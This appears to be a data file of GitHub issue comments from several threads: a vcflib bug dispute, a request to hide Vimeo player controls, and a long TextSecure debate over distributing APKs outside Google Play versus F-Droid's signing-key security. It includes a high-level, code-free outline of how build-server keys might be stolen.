6558	"Moreover, at least have the good grace to say _""hey thanks!""_ to the developer who - despite being unconnected to the project or your work in any way - took time out of _their_ working day to help _you_ (and others) out. @kblin Thank you."
6559	"@kblin thanks for the fix!
@deniseduma I have little to add to what the other commenters have said, other than:
1. I do hope you learn from this experience, which looks set to become a textbook example of how **not** to file a github issue.
2. In future, if you find your work blocked by a bug in free software that your busy schedule does not permit you to fix yourself, I would be happy to put you in touch with one of several software consultancy firms who will be happy to fix it for cash, and may even (as a result of that cash) be more tolerant of you venting your frustration when things don't immediately work the way you need them to."
6560	In the future, if I find my work blocked by an elementary mistake in free software, I'll make sure to use better (free) software out there, but thanks for your unnecessary advice!  
6561	"I had no idea that Donald Trump was on Github and processing VCFs.


--t

On Mon, Jul 31, 2017 at 12:31 PM, deniseduma <notifications@github.com>
wrote:

> In the future, if I find my work blocked by an elementary mistake in free
> software, I'll make sure to use better (free) software out there, but
> thanks for your unnecessary advice!
>
> —
> You are receiving this because you are subscribed to this thread.
> Reply to this email directly, view it on GitHub
> <https://github.com/vcflib/vcflib/issues/206#issuecomment-319171838>, or mute
> the thread
> <https://github.com/notifications/unsubscribe-auth/AAARImzyRfB_J6QdLzVn1mlXBD5Fo7kqks5sTit9gaJpZM4OnvOm>
> .
>
"
6562	"I can't believe that this is happening. I've heard about events like this, but haven't seen them, now I have.
While some developers and/or maintainers can be more or less proactive and the docs can be less up to date. Most often this comes down to FREE time that people have and willing to invest into the project. 
I mean I can watch a move or play with my kids or lie flat on my couch and many more or.. OR I can help science community to be better. Open source isn't just about the code its about docs, tests, bug issues, bug fixes, just a good vibe from folks...

@deniseduma are you helping science community to be better by filling an issue ? Good on ya!

I felt that @tseemann and @kblin in particular doing a great job at facilitating this issue, but everyone else is also adding great deal to this project, great job everybody !

open source is extremely important on many fronts and github is a great place for it.
   "
6563	"@deniseduma @kblin's fix has been pulled into the master branch.  I'm sorry for your frustrating experience.  Just for some context, I introduced the bug while doing a code cleanup, where I fixed several other bugs.  I tested the code before committing and releasing it, even for multi-allelic states.  

Thank you for reporting the bug.  

--Zev 
"
6564	Thank you for fixing it and letting me know!  
6565	"There is not a way to do that at the moment. What is your use case?
"
6566	"i'm developing a ""screensaver"", when user didn't touch anything an overlay video cover the website. it works really fine, player.js is so fast and the quality is very good. 

Control bar appears only for 3 second, is not a big deal really, but anyway i'm trying to remove it. 
Thanks @bdougherty 
"
6567	"Has this ever been worked on/implemented? I assume, based on the number of Google search results, this is a pretty wanted feature. Unlike @na86, unfortunately this is a big deal for our team and would need a way to remove the controls.
"
6568	"Same here. Found this http://www.cssplay.co.uk/menu/cssplay-vimeo-hide-control-bar.html but very hackish. 
I guess it must be related to https://vimeo.com/XXXX/settings/embed, and the pro feature that allows to set the way a video is embed ? See bellow.

however this would be a must !

<img width=""699"" alt=""screen shot 2016-11-21 at 23 35 54"" src=""https://cloud.githubusercontent.com/assets/285033/20503580/73cff702-b043-11e6-9c15-27d91313fbdc.png"">
"
6569	"Hey @countrygeek, let me provide a little color on why I've been reluctant to distribute APKs outside of Google Play.

First, I'm concerned primarily with the security of our users, and am interested in targeting a demographic that does not know what a checksum or signature is.  You might call them ""newbies,"" but personally I think we're doing a good job if these are the bulk of our users.

It may be an unpopular opinion, but I think the two worst security moves that an average user can make are rooting their device, or ticking the ""allow 3rd party APKs"" box in Android's settings.  As bad as Google is, I believe that these actions make users susceptible to something that is much worse.

We are reluctant to distribute raw APKs for a few additional reasons:

1) No upgrade channel. Timely and automatic updates are perhaps the most effective security feature we could ask for, and not having them would be a real blow for the project.

2) No app scanning. The nice thing about market is the server-side APK scanning and signature validation they do. If you start distributing APKs around the internet, it's a reversion back to the PC security model and all of the malware problems that came with it.

3) No crash reporting. We are able to react very quickly to crash bugs through exception reports.

4) No stats. We are largely dependent on Play for knowing how many users we have, what types of devices they're running, and what version of Android they have. This allows us to make decisions about where to prioritize development and which platforms we should be supporting.

5) Avoiding Play alone is not a privacy win.  Many people seem to be under the impression that avoiding Play prevents their device from phoning home to Google, but that's not the case. On 2.2+, if you have the GSF on your device, it will phone home whether you have a Play account registered or not.

So that's where we are.  I believe that the decision not to distribute prebuilt APKs achieves the following balance:

1) It does not encourage the average user to tick ""allow 3rd party APKs"" in Android settings.

2) It allows ""power"" users who can appropriately manage the risks to install TextSecure without Play by building from source.

The thesis essentially being, if you aren't able to build TextSecure from source, you probably aren't capable of managing the risks associated with 3rd party sources.
"
6570	"FWIW I appreciate this posture.  The usefulness of this app increases for me every time a friend or family member installs it ... most of whom aren't power users.
"
6571	"@moxie0 Thanks for clarifying, it does help me better understand your thoughts on it. 

However, I have some possibilities for what you mentioned.
1) No Upgrade Channel. Most Debian-based distros suffer the same, which is why they made PPA's. Further reason to offer a repository of your own which is only available via HTTPS and synced as soon as a build is made. It can be GPG signed for powerusers who are unable to compile the tool everytime a new build is made. This can be due to a number of reasons, slow connections or unreliable and censored connections while trying to download the entire Android SDK. 

Don't forget the people in Arab Spring. A quick download of an APK from a trusted party vs. an entire tool-chain when Google Play is blocked is more practical. 

2) No App Scanning - Agreed. Although Google does a fairly poor job as well, plenty of active malware is inside the market. The best defense a regular user can do is watch their Permissions and install an Anti-Virus. ""Powerusers"" could install PermissionBlocking software and firewall their applications, as well as hash check them and check their GPG signatures.

3) No Crash Reporting - I think Mozilla's Fennec project did an excellent job of this -
https://wiki.mozilla.org/Mobile/Fennec
They use their own crash reporter which doesn't require Google to function.

4) Stats - understandable, but I think users would prefer to opt-in to sharing statistical information. e.g. Cynanogen Mod asks if this ""OK"" before sharing. Google only asks if it's OK to share a crash report, the rest is fair game.

5) Definitely Agree, Google controls many facets of the phone - Oh and let's not forget CarrierIQ. That's why NoGAPPS and Replicant Project is definitely something to watch long-term. 
http://replicant.us

I believe, as rightly communicated in your other tool, Convergence.io - there must also be decentralization in layers of security. If Google has complete central control, and if they ever become compromised the entire network and users are then compromised; additionally, if it fails or is blocked it becomes impossible to access. That's why there needs to be fallback nodes/mirrors whatever you want to call them.

Outside the scope of this project, I think there should be a repository which is peer-reviewed for security, as well having an established WebOfTrust, perhaps P2P based,  that doesn't require users to uncheck ""3rd party apps"" and is open-source. 

FDroid for example (as soon as more security measures are in place) could become the official repository on Replicant devices. Then users would not have to uncheck 3rd party apps. That's when tools like this should be included in the repository and updated regularly, as well as being system apps in ROMs. It would also need to regularly pull commits and updates like Arch so there was no delay that puts users at risk.
But that's for hopeful dreaming - until then we have we have. 
"
6572	"> 1) No Upgrade Channel. Most Debian-based distros suffer the same, which is why they made PPA's. Further
> reason to offer a repository of your own which is only available via HTTPS and synced as soon as a build is
> made. It can be GPG signed for powerusers who are unable to compile the tool everytime a new build is made.
> This can be due to a number of reasons, slow connections or unreliable and censored connections while trying to
> download the entire Android SDK.

Generally speaking, comparisons to the PC world are not going to resonate with me.  The security model for desktops (unix-based and windows-based) is completely broken, and I think the mobile environment should be a chance to rectify our past sins, not copy them.

The current situation is that it's not (rightly!) possible for a 3rd party app to automatically install an APK.  This fundamentally prevents auto-updates from being a reality outside of Play.

> Don't forget the people in Arab Spring. A quick download of an APK from a trusted party vs. an entire tool-chain
> when Google Play is blocked is more practical.

Unfortunately, circumvention problems extend beyond the download.  RedPhone depends on GCM, and soon TextSecure likely will as well.  My sense is that other projects are better positioned to deal with circumvention in the general case.

> 2) No App Scanning - Agreed. Although Google does a fairly poor job as well, plenty of active malware is inside
> the market. The best defense a regular user can do is watch their Permissions and install an Anti-Virus. 
> ""Powerusers"" could install PermissionBlocking software and firewall their applications, as well as hash check 
> them and check their GPG signatures.

Actually, the malware incidence inside of the Play Store is exceptionally low.  Compare it to desktop malware, and it's nonexistent.  The bulk of mobile malware (drudged up by AV companies to justify their existence) has been in 3rd party app stores and random drive-by downloads.  And the problem with depending on mobile AV is that mobile AV is a complete joke, even more so than desktop AV.  These apps have no system integration, so they literally can't do anything other than look at a 3rd party APK at install time.  It's quite easy to evade any signature detection and then simply disable the AV app.  This is already happening.

Again, I feel like we should be desperately trying to avoid what we inherited with the desktop paradigm, rather than reproducing it.

> 3) No Crash Reporting - I think Mozilla's Fennec project did an excellent job of this -
> https://wiki.mozilla.org/Mobile/Fennec
> They use their own crash reporter which doesn't require Google to function.

A good crash reporting solution is essentially a product in itself.  There are entire companies built around mobile crash reporting, but as far as I've seen, none of them are as good as the default Play reporting.  To ask that I develop and maintain my own is a big ask.  I can't emphasize how important this is to the project.

> 4) Stats - understandable, but I think users would prefer to opt-in to sharing statistical information. e.g.
> Cynanogen Mod asks if this ""OK"" before sharing. Google only asks if it's OK to share a crash report, the rest is
> fair game.

Build me a high quality stats reporting solution with a nice web interface that displays graphs and trends of time. Then manage the server side hosting for me, and I'll use it.  =)

> I believe, as rightly communicated in your other tool, Convergence.io - there must also be decentralization in
> layers of security. If Google has complete central control, and if they ever become compromised the entire
> network and users are then compromised; additionally, if it fails or is blocked it becomes impossible to access.
> That's why there needs to be fallback nodes/mirrors whatever you want to call them.

This is actually how the Play Store works right now.  Google does not have complete control over all updates: I sign all APKs with my own code signing key that is kept offline.  These signatures are enforced by the PackageManagerService on each user's device, not by the Play Store itself.  The mechanics are very similar to TACK (http://tack.io), which is what we're currently advocating for the TLS world.

This is in huge contrast to how the bulk of apps on fdroid are distributed.  Most are not signed by the developers, but by fdroid itself, with keys that they keep online.  I believe this is a dangerous situation, and is one of the primary reasons (along with having to enable 3rd party sources) that I don't recommend using fdroid.
"
6573	"I am happy to see this issue discussed here and i would like to add another user requesting this app to be available from outside Google Play. I do not use Google Play since I do not wish to bundle my phone with a Google account. I do see your reasoning in why you are reluctant to support anything else, but I think you should reconsider this, at least for alternatives that actually care about security and open source software. I fully agree that decentralization is a vital requirement for secure designs and that monopolies should be avoided. History shows many examples. 

For my daily use I use fdroid exclusively, since I see the need for a trustworthy source of applications and an update mechanism. Fdroid provides this for me at the level that I require. Yes, some details could be improved (such as statistics), but I think it's very much a step in the right direction. I do believe the fdroid folks are in general very open to suggestions. 

I very much wish I could get the most recent TextSecure through fdroid as well rather than having the choice between running a version older than Methusalem or building from source. Avoiding the former should be in your very own interest as the author of the app. The latter requires me to constantly monitor for updates and bugs and is manual work which I wish I could avoid. Since most of my friends and family use cyanogenmod and fdroid as well I am very reluctant to suggest them to upgrade to TextSecure, since that would put me in the apk maintainer position. 

For these reason I would greatly appreciate to see TextSecure back in fdroid, and I would very much hope you reconsider your position on this.
"
6574	"@moxie0 Might I give my five cents here?

I've gone through all the discussions on this, and this is my overall conclusion: Your concern here seems to be the safety of your users. You don't want them ignoring the availability of newer versions, or downloading APK's from sources that don't provide you with use/device statistics. Is that correct?

Now, here's my point of view - What about the users who do not want to use Google Play and do not want to follow your advice? Surely you can consider that as harmful to them - but that's their problem, not yours. And the amount of people who use F-Droid is in no way comparable to the amount of people who use Google Play.

Moreover, I would certainly not think that by keeping F-Droid from packaging your software you are getting more installs on Google Play. Most of the people who use it would never consider using Google, thus you're just making life harder for these people. Nor are you winning anything by that prohibition.

Please do tell me if I understood anything the wrong way. I just started packaging for F-Droid as a hobby, and I'd like to package your software in the following days. Hopefully there won't be a problem with that.
"
6575	"mvdan, thanks for adding this. Indeed I would never consider using Google Play, that was the point I was trying to make. I build it myself until I find an alternative way of getting the app in a recent version. Unfortunately my grandma can't do that (building it herself) so she can't use it. ;)
"
6576	"If the app uses GCM will it be usable without Google Play?

F-Droid admin does not keep the keystore online: how could one come to that conclusion? 

He signs the apks, thus we know if updates are also signed by him; I don't see why this fact should upset the whole idea of sharing software as set out in the GNU GPL.
"
6577	"@Argafal

> I am happy to see this issue discussed here and i would like to add another user requesting this app to be
> available from outside Google Play. I do not use Google Play since I do not wish to bundle my phone with a
> Google account. I do see your reasoning in why you are reluctant to support anything else, but I think you should
> reconsider this, at least for alternatives that actually care about security and open source software. I fully agree
> that decentralization is a vital requirement for secure designs and that monopolies should be avoided. History
> shows many examples.

But I'm reluctant to distribute APKs outside of the Play Store precisely because I care about the security of TextSecure users.

Additionally, many folks seem to think that not adding a Google account to their device is a privacy win, when that's rarely the case.  If your device has GSF installed, the privacy implications are the same whether you have a Google account associated or not.

> For my daily use I use fdroid exclusively, since I see the need for a trustworthy source of applications and an
> update mechanism. Fdroid provides this for me at the level that I require. Yes, some details could be improved
> (such as statistics), but I think it's very much a step in the right direction. I do believe the fdroid folks are in
> general very open to suggestions.

It's not just statistics.  The problem is the security model.  The bulk of applications distributed through fdroid are signed by keys that belong to the fdroid maintainers, and which are kept _online_.  This means that the fdroid maintainers themselves, **or any attackers who compromise fdroid**, are capable of pushing malware to your device.

This is a huge contrast to Google Play, where **every** app is signed by keys that belong to the app's developers.  Google, or attackers who compromise Google, are not capable of pushing rogue updates.

> I very much wish I could get the most recent TextSecure through fdroid as well rather than having the choice
> between running a version older than Methusalem or building from source. Avoiding the former should be in your
> very own interest as the author of the app. The latter requires me to constantly monitor for updates and bugs and
> is manual work which I wish I could avoid. Since most of my friends and family use cyanogenmod and fdroid as
> well I am very reluctant to suggest them to upgrade to TextSecure, since that would put me in the apk maintainer
> position.

Again, I know that this is probably an unpopular opinion, but if you've set your ""less technical"" friends and family up with cyanogenmod and fdroid, I believe that you've very seriously compromised their security.  Both cyanogen and fdroid seriously compromise the security gains that we've made in the mobile environment and are a reversion back to the desktop security model:

1) Cyanogen runs things as root, completely circumventing the development of a fine grained permissions system.  They've also made a number of tradeoffs that further weaken its security.

2) In order for your friends to run fdroid, they've had to tick ""allow 3rd party sources,"" which is probably the single most effective malware prevention mechanism for less savvy users.

It's exactly this (setting less technical users up with things like fdroid) that I am afraid of.

For you, compiling and installing from source once a week is literally three commands: git pull && ant release && adb install -r bin/TextSecure-release.apk.  For your friends who are not technically capable of doing this, I believe that this means they aren't savvy enough to tick ""allow 3rd party sources"" responsibly.

I totally agree that 3rd party app store alternatives seem cool, but until they're done securely and correctly, I'd prefer not to participate.
"
6578	"@mvdan

> Now, here's my point of view - What about the users who do not want to use Google Play and do not want to
> follow your advice? Surely you can consider that as harmful to them - but that's their problem, not yours. And the
> amount of people who use F-Droid is in no way comparable to the amount of people who use Google Play.
> 
> Moreover, I would certainly not think that by keeping F-Droid from packaging your software you are getting more
> installs on Google Play. Most of the people who use it would never consider using Google, thus you're just
> making life harder for these people. Nor are you winning anything by that prohibition.

I can't willingly participate in something that I believe is a bad idea.  I can't sign and distribute packages through fdroid, because I believe that fdroid is harmful, and I don't want to endorse harmful activity.

I understand that many of the people commenting here probably understand how insecure fdroid is, but value a full OSS stack more than the security of their device.  That's fine, but I think anyone that completely understands the risks is also completely capable of building TextSecure from source themselves.  It's the people that don't understand the risks that I'm worried about.

> Please do tell me if I understood anything the wrong way. I just started packaging for F-Droid as a hobby, and I'd
> like to package your software in the following days. Hopefully there won't be a problem with that.

It's my preference that you don't.  I spend a lot of time on this project, and I'm certain that having APKs floating around which are signed by someone else will inevitably cause problems for me in the future.

I realize that everyone here likely has their own projects that they spend their time on, but before jumping straight to the high-level decisions for the direction of this project, I would recommend that people who are interested in this project's direction start by committing a little bit of code here first, in order to get a feeling for this codebase and its challenges.
"
6579	"@moxie0 

You're not being asked to participate in F-Droid, nor are you needed to sign or distribute any packages for it.

And, as much as security seems to be quite subjective, I would not say F-Droid is insecure. Like @dalb8 stated, no keys are online, and the default downloads are through SSL. I see no big insecurity here. Even if there was, that's the risk the user is willing to take once he installs F-Droid and accepts the terms of service. Much like with CM - we are not bringing malware to the masses.

I see it is your preference that we don't package it. But I don't understand the reason. We can always add something like the following to the description:

> Please make sure that you're running the latest upstream version before submitting any bug reports.

Would that suffice? It has been said before that you ""forbid"" us from packaging it, but that's not what I understood. You'd rather not have people install it from non-Google sources, but we can still package it as-is without a problem.
"
6580	"It's my preference that you don't.  I would also reiterate that it might behoove you to commit even a single line of code before you jump straight to signing your own releases. =)
"
6581	"> It's my preference that you don't. I would also reiterate that it might behoove you to commit even a single line of code before you jump straight to signing your own releases. =)

Although you might be right, I have never done any serious Java. Still getting started with C++. Perhaps someone else would be of some use to you. But so far all I've been doing is packaging.
"
6582	"The only secret is to begin. Pick one of the open issues, start working on it, and you'll figure it out as you go.
"
6583	"@moxie0 -- As one of the former users of TextSecure via fdroid, and someone who values libre software and security, I'd like to say that I appreciate your points, and feel pretty good about my decision to keep using TextSecure as deployed by the Play store.

However, I'd still prefer to use fdroid for as many apps as I can, and I'd also like to have some sense of security when using it.

As a compromise, do you think you could outline, either on [fdroid's bug tracker](http://f-droid.org/repository/issues/) or here, exactly what would need to be fixed in fdroid before you'd consider allowing TextSecure on it? Then, the people who want TextSecure in fdroid can fix those bugs, or work towards fixing them. Either way, everyone benefits: you get a definitive end to these issues, and fdroid gets more secure.

As an FSF member, free software advocate, fdroid user, etc., I hope that if Moxie does this, it ends this discussion until those bugs are resolved. Moxie is the maintainer of a free software package; he's under no obligation to do even more work than he already has for our benefit; forcing him to repeat himself on bug reports like these is to no one's benefit.

(At least one of the things mentioned in this thread is not necessarily an issue: there are some packages in fdroid that have packages signed by the maintainers, including the Firefox build, I believe.)
"
6584	"This is the current list of things that we need before we can distribute an APK outside of the Play Store.  Any help completing these missing pieces would certainly be appreciated:
- A built in crash reporting solution with a web interface that allows us to visualize crashes and sort by app version, device type, etc. This is essential for producing stable software.
- A built in statistics gathering solution with a web interface that allows us to visualize aggregate numbers on device type, android version, and carriers for our users. This has been crucial in shaping support and development direction.
- A built in auto-update solution. Fully automatic upgrades won't be possible outside of Play Store, but we at least need something that will annoy the hell out of users until they upgrade. This is necessary for ensuring that new security features and bug fixes can be propagated quickly.
- A build system that allows us to easily turn these features on and off for Play and non-Play builds. Gradle should make this easier.
"
6585	"""1) Cyanogen runs things as root, completely circumventing the development of a fine grained permissions system. They've also made a number of tradeoffs that further weaken its security.""

Sniffing phone communication, like motorola did?
http://www.beneaththewaves.net/Projects/Motorola_Is_Listening.html?source=hn

Or maybe you think about Trojans like Carrier iQ?
http://gizmodo.com/5864220/what-is-carrier-iq

Closed source (official) ROMs doesn't have weak security, there are completely compromised. Full of malware, trojans and backdoors.

2) In order for your friends to run fdroid, they've had to tick ""allow 3rd party sources,"" which is probably the single most effective malware prevention mechanism for less savvy users.

If you have your official OEM ROM, you don't have to install any malware, you have all out of the box
"
6586	"I've read the whole conversation and I don't understand something : if someone want textsecure but don't want to use a google account and has better thing to do than learn how to compile an android software, he can either download a very very very old version or take an .apk compiled by someone on internet without knowing if the .apk he's downloading has been compromised or no. Do you really prefer these two insecure option for your users instead of releasing an official binary, compiled by your hands, right here ?

Also I don't understand why the fact of not knowing how to compile a source code make you not enough responsible to untick the ""third party app"". I know many guys who know how to program and compile codes but they still can't avoid stupid viruses on Internet and next to them some people who can't even read a source code but are enough intelligent to know which app is good and safe for them. Your argument is invalid.

""I spend a lot of time on this project, and I'm certain that having APKs floating around which are signed by someone else will inevitably cause problems for me in the future."" If you really think this the most intelligent thing to do is to compile and sign yourself the .apk who will floating on internet. don't give the time to creepy black hats to do it before you.
"
6587	"@KaitoKito If you look at the number of open issues we have right now, we're substantially behind where we'd like to be in terms of providing support.  We're at a place where raising our support load by even 1% would be really overwhelming, and my sense is that an official non-Play APK release _without_ the 4 prerequisites I list above would have that impact.

So I'd love to get a non-Play APK distribution channel going, but we need to do some work in order to make that happen smoothly.  If this is something you're interested in seeing, the best thing you can do to help is to take on some of the work listed here: https://github.com/WhisperSystems/TextSecure/issues/127#issuecomment-21763521
"
6588	"Too true: anybody can be careless, even clever people. However, I don't think it's fair to portray compiling apps as difficult. Some are, but not this one — give it a try!
"
6589	"Hello moxie,

thank you for your discussion about this issue. There are many other developers out there, who close such issues very fast, avoiding the opinions and preferences of other users.

I recognize you think the ""security model for desktops (unix-based and windows-based) is completely broken"" and ""believe that fdroid is harmful, and [you] don't want to endorse harmful activity.""

As I understand it, your sense of security lies in the use of Google Play in combination with the deactivation of the ability to install 3rd party applications. The ability to create, sign and upload your app to the Playstore yourself gives you alone the full control of it. Nobody else should be able to provide any other (probably compromised) version of your app.

Although I can understand the positive implications of this, I nevertheless strongly want to disagree with this perspective. First: It's condition is to trust two involved parties.
1. Google
   I do not know, what Google _really_ does. Its main purpose of existence is the processing of data, _our_ data. It can keep track of our phones, our contacts, our communication, our preferences, what apps we use when and how often and who knows what else. I do not allege Google to use this data against us (yet?) (maybe undeliberately?), but I simply do not want to create any account with Google just to be able to install some few apps I would like to use. And as you can see, there are many other users who think alike.
   I do not know if Google modifies your created package in some way, too. It _may_ be unlikely, but I cannot be absolute sure they don't either. Who programmed the key-verification routines and how do they really work with all those Google Apps?
   In the end, if I would want to install something from Google Play, I will have to give Google my trust.
2. (Please don't take this personally) You
   I do not believe you have any bad interests when providing us your software. (And I am of course grateful you provide it at all!) But the fact is, the way I see it now, you are the only one involved in creating this package, and I therefore need to trust you alone with it. It could be very easy for you to patch every version just before you compile it and add a few lines. No one would ever know. Maybe in a year or so, someone sends you a generous check, if you would be so nice to add some specific code. Maybe someone hacks your server/workstation and uploads a new version under your name. Again: I don't think this will happen and you are probably trustworthy, but in the end, the trust in you alone is mandatory.

Now, it is of course essential, that security is not possible without the trust to anybody. So second: The problem with your concept is, that we - the users - do not have the choice who we trust. If we want to install the app, we are _forced_ to trust you with packaging and to trust Google with providing it.
(I leave the option to compile the source ourselves, because that is not the issue here. I believe the issue is to provide users an easy and secure concept of installing and using applications.)

If however, other people in an open community become involved in the distribution of applications and this distribution is transparent and replicable, the possibility of compromised software gets lower.

Why is that so?
a) The chances, that several people at once have malevolent intentions is lower. If only one person is involved, he/she can do whatever he/she wants without anybody else noticing.
b) If someone does something wrong (either intentionally or accidentally), there is a good chance that someone else recognizes this.
c) In case of a bigger project like F-Droid (or take Debian for example to mention one of your ""faulty desktop security models""), the impact of something bad would fall back on the whole project. It is unlikely that people will risk losing their trust by risking something bad with a few apps/programs.

And finally, I cannot emphasize enough the most important thing I believe security should have: The freedom of choice! If I think Google is untrustworthy, I should have the possibility to get my app elsewhere. If I believe F-Droid sucks, I should be able to get the apk from maybe another distributor or on the webpage of the author. If I believe, even this apk is compromised, I should have the possibility of compiling it myself.
The attitude of someone who pursues the open policy of providing his software to other people using different channels raises in my opinion the credibility of that person and the project.

If people however need to trust _one single instance_, it gives this instance great power about them. And we all know: With great power comes great responsibility.
Unfortunately there were often times in the past, were great power was misused at some point sooner or later.

And in the end, security remains entirely with the user. If he does not care or understand what it means (or what kind of security he desires), not your and not my concept will completely help him.

By the way:
a) The ""demographic that does not know what a checksum or signature is"" will probably use Google Play either way.
b) The users who do not want to create a Google account will probably still not create one just to use your app.
c) It is very likely that someone will start a fork or create a new app instead. So your concern about the security of the users of your app may be honorable, but you will not really help them by restricting your software that way.

P.S.: I installed Cyanogenmod on my device and cannot find any GSF. If I am missing it I would be interested in how my device may still phone home to Google.
"
6590	"@zak333:

_I do not know if Google modifies your created package in some way, too. It may be unlikely, but I cannot be absolute sure they don't either. Who programmed the key-verification routines and how do they really work with all those Google Apps?_

You can be absolutely sure.  PackageManagerService is OSS, so you (or anyone) can audit the code.

_(Please don't take this personally) You
I do not believe you have any bad interests when providing us your software. (And I am of course grateful you provide it at all!) But the fact is, the way I see it now, you are the only one involved in creating this package, and I therefore need to trust you alone with it. It could be very easy for you to patch every version just before you compile it and add a few lines. No one would ever know. Maybe in a year or so, someone sends you a generous check, if you would be so nice to add some specific code. Maybe someone hacks your server/workstation and uploads a new version under your name. Again: I don't think this will happen and you are probably trustworthy, but in the end, the trust in you alone is mandatory._

If you don't trust the packager, I think your only option is to build it yourself.  Fortunately, we've gone to great lengths to ensure that this can be done by typing a single command: `gradle build`

If you're concerned about trusting me to package the source, I'm not sure why you would be less concerned about someone random at F-Droid packaging the source.  At least my signing keys aren't online!

_And finally, I cannot emphasize enough the most important thing I believe security should have: The freedom of choice! If I think Google is untrustworthy, I should have the possibility to get my app elsewhere._

You don't have to convince me.  I would love to distribute an APK outside of Play.  Above, I've outlined the four missing pieces we need in order to do that.  If this is something that you are interested in seeing happen, all it takes is helping us get those done.
"
6591	"> If you're concerned about trusting me to package the source, I'm not sure why you would be less concerned about someone random at F-Droid packaging the source. At least my signing keys aren't online!

Just two quick comments:
- You can be less concerned because the whole build process is public, verbose and reproducible by anyone.
- Our keys are not online. Where did you get that?
"
6592	"> You can be less concerned because the whole build process is public, verbose and reproducible by anyone.

As it is for me. If that's not good enough somehow, I don't see how someone else building it is any different.

> Our keys are not online. Where did you get that?

So every time any one of your packages needs to be updated, someone hand carries the source to an airgapped machine, plugs in the HSM with the key specific to that app, runs the build, and carries the signed APK back over to the networked machine?  How do you scale that process across all of the apps you distribute?  How do you physically store all of your HSMs?
"
6593	"> As it is for me. If that's not good enough somehow, I don't see how someone else building it is any different.

I'm not saying that our method is any better than yours or anyone else's. I'm just saying that argueing that it is less secure doesn't make sense either (edit: as far as I know or have been told)

> So every time any one of your packages needs to be updated, someone hand carries the source to an airgapped machine, plugs in the HSM with the key specific to that app, runs the build, and carries the signed APK back over to the networked machine? How do you scale that process across all of the apps you distribute? How do you physically store all of your HSMs?

The process is similar to what you say. There is the web server holding the site and the repo over http and https, and there's a machine without any kind of remote access that holds the keys and runs the builds. All of this is to be done separately for each repo, in fact a single fdroiddata dir can only handle a single repo. Repos should never share their keys with any other repo, at least we won't do that with the main repo.

How do we physically store the sensible data? I don't have access to said machine (only one person does), so I'm guessing it is stored in a secure place in an encrypted file system. But that's only a guess following what I would do.

Just to clarify, the building machine uses ssh to provide the hosting machine with the apks, the icons, the index, etc. This is all public if you check the fdroidserver python source.
"
6594	"My understanding is that the keys are offline only in the sense that the machine doesn't accept incoming internet traffic. The encrypted keys are stored on the same machine as the builds which are done in a VM.

Theoretically, it allows for bit-for-bit reproducible builds, which would allow anybody to verify that an apk was built as described, negating the need for HSMs and such.
"
6595	"> Just to clarify, the building machine uses ssh to provide the hosting machine with the apks, the icons, the index, 
> etc. This is all public if you check the fdroidserver python source.

If the keys are on a machine that's connected to a network, then the keys are online.  Just because only one person is _supposed_ to have access to the machine doesn't mean the keys are offline.  =)

It also sounds like you're saying that you're not using HSMs, which means that an attacker could actually copy the keys and use them to sign APKs out of band.
"
6596	"> If the keys are on a machine that's connected to a network, then the keys are online. Just because only one person is supposed to have access to the machine doesn't mean the keys are offline. =)

It's connected to the network, yes, but it's not that simple. The builds are done inside a virtualbox machine, and the keys are definitely not there. So I don't see the trouble in using keys that way. They would only be released if the admin did it on purpose.

> It also sounds like you're saying that you're not using HSMs, which means that an attacker could actually copy the keys and use them to sign APKs out of band.

I'm curious, how would that be accomplished? No sarcasm intended, really.
"
6597	"> I'm curious, how would that be accomplished? No sarcasm intended, really.
1. The hosting machine is compromised.
2. The attacker compromises the build machine the next time the build machine connects to the hosting machine via SSH.
3. The now-compromised build machine waits for the keys to be provided for a build, inserts them into a file, and pushes them to the hosting machine via SSH.
4. The attacker downloads the keys and uses them to sign APKs out of band.

A machine that has network communication with other machines isn't ""offline.""

How are the keys actually stored? Are they just outside the virtualbox image or something? You could just as easily have step 2.5: the attacker compromises the virtualbox environment and then compromises the VM host.

In contrast, presumably Moxie has a hardware security module (https://en.wikipedia.org/wiki/Hardware_security_module) that stores key material in such a way that it is inaccessible to his operating system. 
"
6598	"Srsly moxie? Do you think your signing key is store more securely than the key of fdroid's main repo?
Besides the fact that I don't like HSMs, are you using one?

You are right with one thing regarding the fdroid client: there should be an auto update function. Okay, we can do that.
To accomplish this FDroids needs to be installed as a system app. This would also allow installation without enabling apks from unknown sources.
I started implementing unattended install for fdroid which will be the basis for auto update functionality: https://gitorious.org/f-droid/fdroidclient/merge_requests/37
"
6599	"@dalb8 : 

> Theoretically, it allows for bit-for-bit reproducible builds, which would allow anybody to verify that an apk was built as described, negating the need for HSMs and such.

Sort of.  Reproducible builds allow us to verify what's happening in public.  However, we have no visibility into what the f-droid administrator or any attackers who get access to that machine do with the keys outside of public view.  Signing keys are an important part of the Android security ecosystem, and centralizing them feels like bad security hygiene to me.  Particularly if those centralized keys are also kept online.

@mvdan :

> It's connected to the network, yes, but it's not that simple. The builds are done inside a virtualbox machine, and the keys are definitely not there. So I don't see the trouble in using keys that way. They would only be released if the admin did it on purpose.

Nobody expects to be hacked.  Comodo, VeriSign, and other CAs didn't expect to be hacked, but they were.  They at least don't keep their root CA certs online.  We have no way to measure the security of f-droid's centralized key database, but online vs offline keys is a good starting point.

@dschuermann :

> Srsly moxie? Do you think your signing key is store more securely than the key of fdroid's main repo?

Yes.  I don't think this is something that's possible for fdroid to avoid.  There is simply no way to keep a centralized keystore that needs to run online automatic build/distribution tasks more secure than an individual developer can, when the latter has the luxury of scheduling their own offline builds.

It's a systemic security problem with the froid model.  Distributed signing is one of the real strengths of Android, and I think there's a clear security cost to centralizing it.  I'm sure you can make the case that fdroid is useful for many reasons, but in my view increased security isn't one of them.
"
6600	"@moxie0 
Yes, you can't keep a centralized keystore more secure than the keystore of an individual developer.
You did not answer to my other points, so I ask again: Is your keystore more secure than the keystore of fdroid? Are you using a HSM? Are you building on a seperate offline machine?
If that's not the case your security is likely the same as the security of fdroid.

If you weren't a known security researcher, I would even argue that the probability that your machine is somehow compromised is much higher than a compromised fdroid build server.
Most Android devs aren't that much security aware (just look at SSL hostname validation in android apps).

Additionally, I would like to know your opinion on https://gitorious.org/f-droid/fdroidclient/merge_requests/37
What if F-Droid is preinstalled like Google Play and would provide an auto update functionality?
"
6601	"I see @moxie0's point of view here, but I agree with @dschuermann in saying that f-droid is no less secure than the decentralized method that the Google Play uses. Mostly because our method isn't centralized at all. It just appears centralized as noone has taken the time to set up and maintain another repo yet, so only the main repo is used by most people.

